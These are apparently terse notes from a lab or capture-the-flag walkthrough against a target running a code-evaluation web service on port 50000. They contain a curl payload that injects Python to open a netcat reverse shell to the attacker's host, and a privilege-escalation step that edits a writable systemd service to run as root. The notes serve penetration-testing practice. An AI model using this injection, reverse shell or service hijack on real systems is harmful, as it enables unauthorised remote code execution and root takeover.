PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

<img width="823" height="142" alt="image" src="https://github.com/user-attachments/assets/d5dedd76-9ca5-40fe-9305-3578241d9628" />

tested post with 2x2 and os
curl -X POST --data "code=2*2" <http://192.168.187.117:50000/verify>

posted revshell
curl -X POST --data "code=__import__('os').system('nc 192.168.45.187 80 -e /bin/sh')" 192.168.121.117
<img width="767" height="86" alt="image" src="https://github.com/user-attachments/assets/002f3f76-147b-440c-a977-2d7a183cb610" />

sudo -l, shows halt reboot and poweroff is available
<img width="1788" height="152" alt="image" src="https://github.com/user-attachments/assets/88c922af-89e6-4353-bbca-4d2ecfee678d" />


/etc/systemd/system/pythonapp.service is owned by cmeeks and is writable
<img width="1369" height="347" alt="image" src="https://github.com/user-attachments/assets/f9dd231a-aa07-445a-820e-0968a8ead2e8" />

change User=cmeeks to root and then sudo reboot
<img width="636" height="316" alt="image" src="https://github.com/user-attachments/assets/70f2905e-3697-4821-8f2f-3af8d9b06b74" />

run reverse shell curl command again. logged in as root
<img width="997" height="273" alt="image" src="https://github.com/user-attachments/assets/a2a67858-689c-4a86-9a06-f85ad67a1c27" />


